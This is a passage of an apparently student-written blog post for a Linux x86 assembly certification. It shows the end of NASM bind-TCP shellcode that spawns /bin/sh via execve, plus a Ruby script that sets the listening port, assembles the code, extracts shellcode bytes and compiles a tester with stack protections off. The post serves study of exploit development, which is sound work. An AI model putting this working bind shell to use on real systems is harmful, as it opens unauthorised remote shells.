  <span class=nf>push</span> <span class=nb>ebx</span>                            <span class=c1>; push NULL</span>
  <span class=nf>push</span> <span class=mh>0x68732f2f</span>                     <span class=c1>; &#34;hs//&#34;</span>
  <span class=nf>push</span> <span class=mh>0x6e69622f</span>                     <span class=c1>; &#34;nib/&#34;</span>
  <span class=nf>mov</span> <span class=nb>ebx</span><span class=p>,</span> <span class=nb>esp</span>                        <span class=c1>; ebx = esp address</span>
  <span class=nf>mov</span> <span class=nb>al</span><span class=p>,</span> <span class=nv>EXECVE</span>                      <span class=c1>; execve(2)</span>
  <span class=nf>int</span> <span class=mh>0x80</span>                            <span class=c1>; syscall execve(2)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id=dynamic-configuration>Dynamic Configuration</h2>
<p>Using a simple Ruby script below, the <code>PORT</code> number can be dynamically assigned:</p>
<div class=highlight><div class=chroma>
<table class=lntable><tr><td class=lntd>
<pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span><span class=lnt>93
</span><span class=lnt>94
</span></code></pre></td>
<td class=lntd>
<pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=ch>#!/usr/bin/env ruby</span>
<span class=c1># Author: Jason Villaluna</span>

<span class=nb>require</span> <span class=s1>&#39;optparse&#39;</span>

<span class=k>def</span> <span class=nf>run</span>
  <span class=n>parse_args</span>
  <span class=vi>@port</span> <span class=o>=</span> <span class=n>to_hex</span><span class=p>(</span><span class=vi>@port</span><span class=p>)</span>
  <span class=vi>@filename</span> <span class=o>=</span> <span class=vi>@filename</span>
  <span class=n>replace_port</span>
  <span class=n>compile_nasm</span>
  <span class=vi>@shellcode</span> <span class=o>=</span> <span class=n>generate_shellcode</span>
  <span class=n>replace_shellcode</span>
  <span class=n>compile_binary</span>
<span class=k>rescue</span> <span class=no>OptionParser</span><span class=o>::</span><span class=no>MissingArgument</span>
  <span class=nb>puts</span> <span class=s2>&#34;Missing argument:&#34;</span>
  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse</span> <span class=sx>%w[--help]</span>
<span class=k>rescue</span> <span class=no>StandardError</span> <span class=o>=</span> <span class=n>e</span>
  <span class=nb>puts</span> <span class=s2>&#34;An error </span><span class=si>#{</span><span class=n>e</span><span class=o>.</span><span class=n>inspect</span><span class=si>}</span><span class=s2> occurred&#34;</span>
  <span class=nb>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Convert number into hex format used by the nasm code</span>
<span class=k>def</span> <span class=nf>to_hex</span><span class=p>(</span><span class=n>number</span><span class=p>)</span>
  <span class=n>hex</span> <span class=o>=</span> <span class=n>number</span><span class=o>.</span><span class=n>to_s</span><span class=p>(</span><span class=mi>16</span><span class=p>)</span>
  <span class=n>hex</span> <span class=o>=</span> <span class=n>hex</span><span class=o>.</span><span class=n>size</span><span class=o>.</span><span class=n>even?</span> <span class=p>?</span> <span class=n>hex</span> <span class=p>:</span> <span class=n>hex</span><span class=o>.</span><span class=n>prepend</span><span class=p>(</span><span class=s1>&#39;0&#39;</span><span class=p>)</span>
  <span class=n>hex</span><span class=o>.</span><span class=n>scan</span><span class=p>(</span><span class=sr>/../</span><span class=p>)</span><span class=o>.</span><span class=n>reverse</span><span class=o>.</span><span class=n>join</span><span class=o>.</span><span class=n>prepend</span><span class=p>(</span><span class=s1>&#39;0x&#39;</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Replace a value inside a file</span>
<span class=k>def</span> <span class=nf>replace_content</span><span class=p>(</span><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;</span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=s2>.nasm&#34;</span><span class=p>)</span>
  <span class=n>file_content</span> <span class=o>=</span> <span class=no>File</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
  <span class=k>yield</span><span class=p>(</span><span class=n>file_content</span><span class=p>)</span>
  <span class=no>File</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=n>file_content</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Replace the port number in the nasm file</span>
<span class=k>def</span> <span class=nf>replace_port</span>
  <span class=n>replace_content</span> <span class=k>do</span> <span class=o>|</span><span class=n>nasm_code</span><span class=o>|</span>
    <span class=n>nasm_code</span><span class=o>.</span><span class=n>gsub!</span><span class=p>(</span><span class=sr>/PORT\s*equ\s\S+/</span><span class=p>,</span> <span class=s2>&#34;PORT        equ </span><span class=si>#{</span><span class=vi>@port</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
  <span class=k>end</span>
<span class=k>end</span>

<span class=c1># Compile the nasm code</span>
<span class=k>def</span> <span class=nf>compile_nasm</span>
  <span class=sb>`nasm -f elf32 -o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.nasm`</span>
  <span class=sb>`ld -m elf_i386 -s -o </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb> </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>.o`</span>
<span class=k>end</span>

<span class=c1># Generate shellcode using objdump</span>
<span class=k>def</span> <span class=nf>generate_shellcode</span>
  <span class=n>objdump</span> <span class=o>=</span> <span class=sb>`objdump -d </span><span class=si>#{</span><span class=vi>@filename</span><span class=si>}</span><span class=sb>`</span>
  <span class=n>objdump</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>map</span> <span class=p>{</span> <span class=o>|</span><span class=n>line</span><span class=o>|</span> <span class=n>line</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\t</span><span class=s2>&#34;</span><span class=p>)</span><span class=o>[</span><span class=mi>1</span><span class=o>]</span> <span class=p>}</span>
    <span class=o>.</span><span class=n>compact</span><span class=o>.</span><span class=n>map</span><span class=p>(</span><span class=o>&amp;</span><span class=ss>:split</span><span class=p>)</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>prepend</span><span class=p>(</span><span class=s1>&#39;\x&#39;</span><span class=p>)</span>
<span class=k>end</span>

<span class=c1># Replace shellcode in the shellcode tester program</span>
<span class=k>def</span> <span class=nf>replace_shellcode</span>
  <span class=n>replace_content</span><span class=p>(</span><span class=s1>&#39;./shellcode.c&#39;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>c_code</span><span class=o>|</span>
    <span class=n>c_code</span><span class=o>.</span><span class=n>gsub!</span><span class=p>(</span><span class=sr>/\&#34;\S+\&#34;\;/</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=si>#{</span><span class=vi>@shellcode</span><span class=si>}</span><span class=se>\&#34;</span><span class=s2>\;&#34;</span><span class=p>)</span>
  <span class=k>end</span>
<span class=k>end</span>

<span class=c1># Compile the shellcode into binary with the help of the shellcode.c program</span>
<span class=k>def</span> <span class=nf>compile_binary</span>
  <span class=sb>`gcc -fno-stack-protector -m32 -z execstack shellcode.c -o shellcode 2 /dev/null`</span>
<span class=k>end</span>

<span class=k>def</span> <span class=nf>parse_args</span>
  <span class=vi>@parser</span> <span class=o>=</span> <span class=no>OptionParser</span><span class=o>.</span><span class=n>new</span> <span class=k>do</span> <span class=o>|</span><span class=n>opts</span><span class=o>|</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>banner</span> <span class=o>=</span> <span class=s2>&#34;Usage: </span><span class=si>#{</span><span class=vg>$0</span><span class=si>}</span><span class=s2> [options]&#34;</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;&#34;</span>
    <span class=n>opts</span><span class=o>.</span><span class=n>separator</span> <span class=s2>&#34;Options:&#34;</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--port&#34;</span><span class=p>,</span> <span class=s2>&#34;-p PORT&#34;</span><span class=p>,</span> <span class=s2>&#34;Port number of the listener&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
      <span class=vi>@port</span> <span class=o>=</span> <span class=n>value</span><span class=o>.</span><span class=n>to_i</span>
    <span class=k>end</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on</span><span class=p>(</span><span class=s2>&#34;--nasm&#34;</span><span class=p>,</span> <span class=s2>&#34;-n NASM&#34;</span><span class=p>,</span> <span class=s2>&#34;Basename of the nasm code&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>value</span><span class=o>|</span>
      <span class=vi>@filename</span> <span class=o>=</span> <span class=n>value</span>
    <span class=k>end</span>

    <span class=n>opts</span><span class=o>.</span><span class=n>on_tail</span><span class=p>(</span><span class=s2>&#34;--help&#34;</span><span class=p>,</span> <span class=s2>&#34;-h&#34;</span><span class=p>,</span> <span class=s2>&#34;Print options&#34;</span><span class=p>)</span> <span class=k>do</span> <span class=o>|</span><span class=n>show_help</span><span class=o>|</span>
      <span class=nb>warn</span> <span class=n>opts</span>
      <span class=nb>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
    <span class=k>end</span>
  <span class=k>end</span>
  <span class=vi>@parser</span><span class=o>.</span><span class=n>parse!</span>
<span class=k>end</span>

<span class=k>if</span> <span class=bp>__FILE__</span> <span class=o>==</span> <span class=vg>$PROGRAM_NAME</span>
  <span class=n>run</span>
  <span class=nb>puts</span> <span class=s2>&#34;Successfully generated </span><span class=se>\e</span><span class=s2>[32mshellcode</span><span class=se>\e</span><span class=s2>[0m binary!&#34;</span>
<span class=k>end</span>
</code></pre></td></tr></table>
</div>
</div><h3 id=script-usage-and-shellcode-testing>Script usage and shellcode testing</h3>
<p><img src=bind_tcp_shellcode.gif alt></p>
<hr>
<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href=http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
<p>Student ID: SLAE - 1558</p>
<hr>
<p><a href=https://github.com/jsnv-dev/slae_x86_assignments/tree/main/A1><code>Link to Github repository</code></a> | <a href=../slae_x86><code>Link to index page</code></a></p>
</div>
</article>
<div id=footer-post-container>
<div id=footer-post>
<div id=nav-footer style=display:none>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</div>
<div id=toc-footer style=display:none>
<nav id=TableOfContents>
<ul>
<li><a href=#objectives>Objectives</a></li>
<li><a href=#structure>Structure</a></li>
<li><a href=#creating-the-nasm-code>Creating the NASM Code</a>
<ul>
<li><a href=#syscalls-and-other-values>Syscalls and other values</a></li>
<li><a href=#socket2>Socket(2)</a></li>
<li><a href=#bind2>Bind(2)</a></li>
<li><a href=#listen2>Listen(2)</a></li>
<li><a href=#accept42>Accept4(2)</a></li>
<li><a href=#dup2>Dup(2)</a></li>
<li><a href=#execve2>Execve(2)</a></li>
</ul>
</li>
<li><a href=#final-nasm-code>Final NASM Code</a></li>
<li><a href=#dynamic-configuration>Dynamic Configuration</a>
<ul>
<li><a href=#script-usage-and-shellcode-testing>Script usage and shellcode testing</a></li>
</ul>
</li>
</ul>
</nav>
</div>
<div id=share-footer style=display:none>
<ul>
<li>
<a class=icon href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f" aria-label=Facebook>
<i class="fab fa-facebook fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://twitter.com/share?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&text=SLAE%20x86%20-%20Assignment%200x1" aria-label=Twitter>
<i class="fab fa-twitter fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=Linkedin>
<i class="fab fa-linkedin fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&is_video=false&description=SLAE%20x86%20-%20Assignment%200x1" aria-label=Pinterest>
<i class="fab fa-pinterest fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="mailto:?subject=SLAE%20x86%20-%20Assignment%200x1&body=Check out this article: https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f" aria-label=Email>
<i class="fas fa-envelope fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://getpocket.com/save?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=Pocket>
<i class="fab fa-get-pocket fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://reddit.com/submit?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&title=SLAE%20x86%20-%20Assignment%200x1" aria-label=reddit>
<i class="fab fa-reddit fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="http://www.tumblr.com/share/link?url=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&name=SLAE%20x86%20-%20Assignment%200x1&description=Bind%20TCP%20Shellcode%20Objectives%20%20Create%20a%20shell%20bind%20tcp%20shellcode%20%20Binds%09to%20a%20port%20Execs%09shell%09on%20incoming%09connection%20%20%20Port%20number%20should%20be%20easily%20configurable%20%20Structure%20Using%20bind%20shell%20from%20msfvenom%2c%20the%20needed%20syscalls%20can%20be%20visualize%20with%20the%20help%20of%20libemu%27s%20sctest%20and%20dot%20tool%3a%0aGenerated%20using%3a%0amsfvenom%20--arch%20x86%20--platform%20linux%20-p%20linux%2fx86%2fshell_bind_tcp%20-f%20raw%20%7c%20sctest%20-vvv%20-Ss%2010000%20-G%20bind_tcp_shellcode.dot%20dot%20bind_tcp_shellcode." aria-label=Tumblr>
<i class="fab fa-tumblr fa-lg" aria-hidden=true></i>
</a>
</li>
<li>
<a class=icon href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fjsnv.dev%2fposts%2fslae_x86_a1%2f&t=SLAE%20x86%20-%20Assignment%200x1" aria-label="Hacker News">
<i class="fab fa-hacker-news fa-lg" aria-hidden=true></i>
</a>
</li>
</ul>
</div>
<div id=actions-footer>
<a id=menu-toggle class=icon href=# onclick="return $('#nav-footer').toggle(),!1" aria-label=Menu>
<i class="fas fa-bars fa-lg" aria-hidden=true></i> Menu</a>
<a id=toc-toggle class=icon href=# onclick="return $('#toc-footer').toggle(),!1" aria-label=TOC>
<i class="fas fa-list fa-lg" aria-hidden=true></i> TOC</a>
<a id=share-toggle class=icon href=# onclick="return $('#share-footer').toggle(),!1" aria-label=Share>
<i class="fas fa-share-alt fa-lg" aria-hidden=true></i> share</a>
<a id=top style=display:none class=icon href=# onclick="$('html, body').animate({scrollTop:0},'fast')" aria-label="Top of Page">
<i class="fas fa-chevron-up fa-lg" aria-hidden=true></i> Top</a>
</div>
</div>
</div>
<footer id=footer>
<div class=footer-left>
Copyright &copy; 2021 jsn>
<a class=icon target=_blank rel=noopener href=https://github.com/jsnv-dev aria-label=github>
<i class="fab fa-github" aria-hidden=true></i>
</a>
<a class=icon target=_blank rel=noopener href=https://www.linkedin.com/in/jasonvillaluna aria-label=linkedin>
<i class="fab fa-linkedin" aria-hidden=true></i>
</a>
</div>
<div class=footer-right>
<nav>
<ul>
<li><a href=/>~/</a></li>
<li><a href=/posts>~/posts</a></li>
<li><a href=/tags>~/tags</a></li>
<li><a href=/about>~/about</a></li>
<li><a href=/work>~/work</a></li>
</ul>
</nav>
</div>
</footer>
</div>
</body>
<link rel=stylesheet href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>
<script src=/js/code-copy.js></script>
</html>